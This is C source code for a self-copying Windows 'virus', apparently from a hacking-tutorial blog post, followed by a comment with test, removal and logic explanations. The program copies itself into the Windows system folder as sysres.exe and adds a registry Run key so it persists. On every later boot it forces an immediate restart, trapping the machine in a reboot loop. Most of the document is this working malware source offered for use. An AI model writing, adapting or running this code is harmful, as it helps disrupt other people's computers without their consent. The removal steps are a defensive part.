#include stdio.h

#include dos.h

#include dir.h

int found,drive_no;char buff[128];

void findroot()

{

int done;

struct ffblk ffblk; //File block structure

done=findfirst(“C:\\windows\\system”,&ffblk,FA_DIREC); //to determine the root drive

if(done==0)

{

done=findfirst(“C:\\windows\\system\\sysres.exe”,&ffblk,0); //to determine whether the virus is already installed or not

if(done==0)

{

found=1; //means that the system is already infected

return;

}

drive_no=1;

return;

}

done=findfirst(“D:\\windows\\system”,&ffblk,FA_DIREC);

if(done==0)

{

done=findfirst(“D:\\windows\\system\\sysres.exe”,&ffblk,0);

if

(done==0)

{

found=1;return;

}

drive_no=2;

return;

}

done=findfirst(“E:\\windows\\system”,&ffblk,FA_DIREC);

if(done==0)

{

done=findfirst(“E:\\windows\\system\\sysres.exe”,&ffblk,0);

if(done==0)

{

found=1;

return;

}

drive_no=3;

return;

}

done=findfirst(“F:\\windows\\system”,&ffblk,FA_DIREC);

if(done==0)

{

done=findfirst(“F:\\windows\\system\\sysres.exe”,&ffblk,0);

if(done==0)

{

found=1;

return;

}

drive_no=4;

return;

}

else

exit(0);

}

void main()

{

FILE *self,*target;

findroot();

if(found==0) //if the system is not already infected

{

self=fopen(_argv[0],”rb”); //The virus file open’s itself

switch(drive_no)

{

case 1:

target=fopen(“C:\\windows\\system\\sysres.exe”,”wb”); //to place a copy of itself in a remote place

system(“REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\

CurrentVersion\\Run \/v sres \/t REG_SZ \/d

C:\\windows\\system\\ sysres.exe”); //put this file to registry for starup

break;

case 2:

target=fopen(“D:\\windows\\system\\sysres.exe”,”wb”);

system(“REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\

CurrentVersion\\Run \/v sres \/t REG_SZ \/d

D:\\windows\\system\\sysres.exe”);

break;

case 3:

target=fopen(“E:\\windows\\system\\sysres.exe”,”wb”);

system(“REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\

CurrentVersion\\Run \/v sres \/t REG_SZ \/d

E:\\windows\\system\\sysres.exe”);

break;

case 4:

target=fopen(“F:\\windows\\system\\sysres.exe”,”wb”);

system(“REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\

CurrentVersion\\Run \/v sres \/t REG_SZ \/d

F:\\windows\\system\\sysres.exe”);

break;

default:

exit(0);

}

while(fread(buff,1,1,self)>0)

fwrite(buff,1,1,target);

fcloseall();

}

else

system(“shutdown -r -t 0″); //if the system is already infected then just give a command to restart

}

/*Testing And Removing The Virus From Your PC

You can compile and test this virus on your own PC without any fear. To test, just doubleclick the sysres.exe file and restart the system manually. Now onwards ,when every time the PC is booted and the desktop is loaded, your PC will restart automatically again and again.

It will not do any harm apart from automatically restarting your system. After testing it, you can remove the virus by the following steps.

1. Reboot your computer in the SAFE MODE

2. Goto

X:\Windows\System

(X can be C,D,E or F)

3.You will find a file by name sysres.exe, delete it.

4.Type regedit in run.You will goto registry editor.Here navigate to

HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Run

There, on the right site you will see an entry by name “sres“.Delete this entry.That’s it.You have removed this Virus successfully.

Logic Behind The Working Of The Virus

If I don’t explain the logic(Algorithm) behind the working of the virus,this post will be incomplete. So I’ll explain the logic in a simplified manner. Here I’ll not explain the technical details of the program. If you have further doubts please pass comments.

LOGIC:

1. First the virus will find the Root partition (Partition on which Windows is installed).

2. Next it will determine whether the Virus file is already copied(Already infected) intoX:\Windows\System

3. If not it will just place a copy of itself into X:\Windows\System and makes a registry entry to put this virus file onto the startup.

4. Or else if the virus is already found in the X:\Windows\System directory(folder), then it just gives a command to restart the computer.

This process is repeated every time the PC is restarted.

NOTE: The system will not be restarted as soon as you double click theSysres.exe file.The restarting process will occur from the next boot of the system.*/
